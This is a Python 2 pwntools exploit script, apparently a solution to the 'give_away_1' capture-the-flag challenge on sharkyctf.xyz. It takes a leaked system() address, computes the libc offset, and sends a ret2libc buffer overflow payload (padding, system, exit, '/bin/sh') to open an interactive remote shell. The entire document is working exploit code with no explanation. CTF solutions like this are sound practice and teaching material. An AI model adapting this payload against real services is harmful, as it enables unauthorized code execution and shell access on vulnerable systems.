#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def solve():

    challenge = ELF('./give_away_1')
    libc = ELF('./libc-2.27.so')

    libc_system_addr = libc.symbols['system']
    info("%#x [libc_system_addr]", libc_system_addr)

    libc_exit_addr = libc.symbols['exit']
    info("%#x [libc_exit_addr]", libc_exit_addr)

    io = remote('sharkyctf.xyz', 20334)
    #io = process('./give_away_1')
    #io = gdb.debug("./give_away_1", "b main")

    io.recvuntil('Give away:')
    system_addr = int(io.recv().strip(), 16)
    info("%#x [leaked system_addr]", system_addr)

    libc_offset = system_addr - libc_system_addr

    system_addr = libc_system_addr + libc_offset
    exit_addr = libc_exit_addr + libc_offset

    binsh = next(libc.search("/bin/sh"))
    info("%#x [libc binsh]", binsh)
    bin_sh = binsh + libc_offset

    padding = 'A' * 36

    payload = padding + p32(system_addr) + p32(exit_addr) + p32(bin_sh)

    io.sendline(payload + '\n')
    io.interactive()

if __name__ == '__main__':
    solve()
